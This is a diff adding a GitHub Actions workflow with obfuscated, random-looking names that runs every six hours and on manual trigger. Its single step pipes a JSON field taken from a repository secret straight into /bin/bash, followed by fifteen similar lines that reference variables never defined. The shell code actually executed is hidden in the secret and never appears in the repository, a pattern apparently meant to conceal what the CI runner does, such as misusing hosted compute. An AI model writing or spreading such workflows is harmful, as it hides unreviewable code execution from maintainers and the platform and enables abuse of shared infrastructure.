@@ -1,0 +1,32 @@
+name: qiuminggang6152
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiuminggang6152
+        env:
+          lhs3984: ${{ secrets.lhs3984 }}
+        run: |
+          echo $lhs3984 | jq -r .rlkmt97419 | /bin/bash
+          echo $qz5 | jq -r .bnxdw63000 | /bin/bash
+          echo $tijzq71 | jq -r .anpk3369 | /bin/bash
+          echo $qq57004 | jq -r .clsz6903 | /bin/bash
+          echo $fzxnz806 | jq -r .chp02 | /bin/bash
+          echo $wcytn11286 | jq -r .kivpr53745 | /bin/bash
+          echo $pwm7 | jq -r .s1980 | /bin/bash
+          echo $kzhuw0 | jq -r .j2202 | /bin/bash
+          echo $c041 | jq -r .bj45 | /bin/bash
+          echo $jhwe0 | jq -r .ijil453 | /bin/bash
+          echo $kihl44 | jq -r .g7 | /bin/bash
+          echo $m402 | jq -r .igdut4224 | /bin/bash
+          echo $rg3 | jq -r .vybb208 | /bin/bash
+          echo $lelr0 | jq -r .madph694 | /bin/bash
+          echo $pjodo92 | jq -r .qgki47 | /bin/bash
+          echo $phxg4 | jq -r .fufjk9827 | /bin/bash
+
